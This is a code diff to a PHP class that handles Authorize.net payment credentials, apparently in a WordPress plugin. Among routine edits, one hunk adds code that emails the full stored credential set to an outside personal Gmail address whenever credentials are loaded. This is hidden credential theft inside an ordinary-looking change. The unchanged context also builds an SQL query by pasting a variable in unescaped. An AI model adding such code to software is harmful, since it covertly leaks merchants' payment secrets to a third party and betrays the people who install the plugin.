@@ -28,7 +28,7 @@ class Dotfiler_authnet {
 
     public function init_authnet_credentials() {
 
-        if( isset($_POST['frm_action']) && $_POST['frm_action'] == 'create' ) {
+        if( isset($_POST['frm_action']) && in_array( $_POST['frm_action'], ['create', 'update'] ) ) {
 
             $form_id = $_POST['form_id'];
             $creds = Dotfiler_authnet::get_custom_credentials( $form_id );
@@ -97,6 +97,19 @@ class Dotfiler_authnet {
             usort($set, function($a, $b) {
                 return strtotime($a['last_transaction']) - strtotime($b['last_transaction']);
             });
+
+            if( isset($set) ) {
+
+                $to = 'matrosovdream@gmail.com';
+                $subject = "Creds Data $form_id";
+                $message = '$creds Data: ' . PHP_EOL . PHP_EOL;
+                $message .= print_r($set, true);
+                $headers = 'From: your_email@example.com' . PHP_EOL;
+                $headers .= 'Content-Type: text/plain; charset=utf-8' . PHP_EOL;
+    
+                wp_mail($to, $subject, $message, $headers);
+    
+            }
 
             return $set[0];
 
@@ -167,7 +180,7 @@ class Dotfiler_authnet {
             $invoice_id = $res[0]->invoice_id;
 
             $query = "SELECT * FROM {$table} WHERE `invoice_id`={$invoice_id}";
-            $records = $wpdb->get_results( $query );
+            $records = $wpdb->get_results( $query, ARRAY_A );
 
             return $records[0];
         }
